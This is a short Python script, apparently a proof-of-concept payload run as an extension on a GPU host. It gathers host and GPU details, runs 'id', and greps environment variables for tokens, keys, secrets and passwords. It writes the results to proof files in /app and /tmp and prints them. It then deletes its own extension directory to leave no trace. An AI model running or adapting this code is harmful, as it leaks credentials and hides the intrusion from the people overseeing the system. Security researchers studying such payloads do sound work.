import subprocess, os, shutil, json
cmd = ("nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,"
       "driver_version --format=csv,noheader; hostname; id; ls -l /dev/nvidia*; "
       "cat /proc/driver/nvidia/version; env | grep -aiE 'token|key|secret|pass' | cut -c1-120")
try:
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90).stdout
except Exception as e:
    out = "ERR " + repr(e)
hdr = "===I147319-PROOF-EOY===\n"
for p in ["/app/i147319_proof.txt", "/tmp/i147319_proof.txt"]:
    try:
        open(p, "w").write(hdr + out)
    except Exception as e:
        pass
try:
    print(hdr + out)
except Exception:
    pass
# self-clean: remove our own extension directory so no residue remains
try:
    d = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(d) == "i147319-ext":
        shutil.rmtree(d, ignore_errors=True)
except Exception:
    pass
